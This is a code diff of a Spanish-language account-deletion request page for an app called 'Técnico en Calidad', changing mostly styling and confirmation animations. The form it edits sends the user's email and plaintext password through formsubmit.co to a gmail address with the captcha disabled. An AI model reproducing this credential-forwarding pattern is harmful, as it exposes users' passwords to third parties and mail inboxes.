@@ -49,7 +49,6 @@ body {
   box-shadow: 0 12px 30px rgba(0,0,0,0.4);
   animation: fadeInUp 0.8s ease forwards;
   transition: transform 0.3s ease;
-  position: relative;
 }
 .container:hover { transform: translateY(-5px); }
 
@@ -131,6 +130,7 @@ button:active { transform: scale(0.97); }
   <ul class="steps">
     <li>1. Abre la aplicación <strong>Técnico en Calidad</strong>.</li>
     <li>2. Toca el botón <strong>"Eliminar Cuenta"</strong> en inicio de sesión.</li>
+    <li>   Llena tus datos</li>
     <li>3. Aparecerá un mensaje de confirmación.</li>
     <li>4. Selecciona <strong>Sí</strong> para continuar.</li>
   </ul>
@@ -140,18 +140,20 @@ button:active { transform: scale(0.97); }
   <form id="eliminarForm" action="https://formsubmit.co/asistenciatecnicostec@gmail.com" method="POST">
     <input type="email" name="email" placeholder="Tu correo electrónico" required autocomplete="email" />
     <input type="password" name="password" placeholder="Tu contraseña" required autocomplete="current-password" />
+
     <input type="hidden" name="Mensaje" value="Deseo eliminar mi cuenta de la aplicación Técnico en Calidad" />
     <input type="hidden" name="_subject" value="Solicitud de eliminación de cuenta - Técnico en Calidad" />
     <input type="hidden" name="_captcha" value="false" />
+
     <button type="submit">Solicitar</button>
     <p class="errorMsg" id="errorMsg">Correo o contraseña incorrectos.</p>
   </form>
 
-  <p class="confirmation" id="confirmationMsg">¡Solicitud enviada! Revisa tu correo para confirmar.</p>
+  <p class="confirmation" id="confirmationMsg">Tu solicitud fue enviada</p>
 </div>
 
 <script type="module">
-  import { signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
+  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
 
   const form = document.getElementById('eliminarForm');
   const confirmationMsg = document.getElementById('confirmationMsg');
@@ -174,43 +176,24 @@ button:active { transform: scale(0.97); }
       })
       .then(response => {
         if(response.ok){
-          // Crear mensaje intermedio
-          const intermediateMsg = document.createElement('p');
-          intermediateMsg.textContent = "Tu solicitud fue enviada";
-          intermediateMsg.style.color = "green";
-          intermediateMsg.style.fontWeight = "bold";
-          intermediateMsg.style.textAlign = "center";
-          intermediateMsg.style.position = "absolute";
-          intermediateMsg.style.top = "50%";
-          intermediateMsg.style.left = "50%";
-          intermediateMsg.style.transform = "translate(-50%, -50%)";
-          intermediateMsg.style.fontSize = "1.2rem";
-          intermediateMsg.style.opacity = 0;
-          intermediateMsg.style.transition = "opacity 0.5s ease";
-          document.body.appendChild(intermediateMsg);
-          setTimeout(() => { intermediateMsg.style.opacity = 1; }, 50);
-
-          // Animación de salida del contenedor
           container.style.animation = 'fadeOutDown 0.5s forwards';
+
+          setTimeout(() => {
+            // Mostrar mensaje en medio de animación
+            confirmationMsg.style.display = 'block';
+            confirmationMsg.style.opacity = 1;
+          }, 250);
+
           setTimeout(() => { container.style.display = 'none'; }, 500);
 
-          // Mostrar mensaje intermedio 2s antes de desaparecer
+          form.reset();
+
           setTimeout(() => {
-            intermediateMsg.style.opacity = 0;
-            setTimeout(() => { intermediateMsg.remove(); }, 500);
-
-            confirmationMsg.style.display = 'block';
-            setTimeout(() => { confirmationMsg.style.opacity = 1; }, 50);
-
-            form.reset();
-
-            setTimeout(() => {
-              confirmationMsg.style.opacity = 0;
-              setTimeout(() => { confirmationMsg.style.display = 'none'; }, 500);
-              container.style.display = 'block';
-              container.style.animation = 'fadeInUp 0.8s ease forwards';
-            }, 5000);
-          }, 2000);
+            confirmationMsg.style.opacity = 0;
+            setTimeout(() => { confirmationMsg.style.display = 'none'; }, 500);
+            container.style.display = 'block';
+            container.style.animation = 'fadeInUp 0.8s ease forwards';
+          }, 5000);
         }
       });
     })
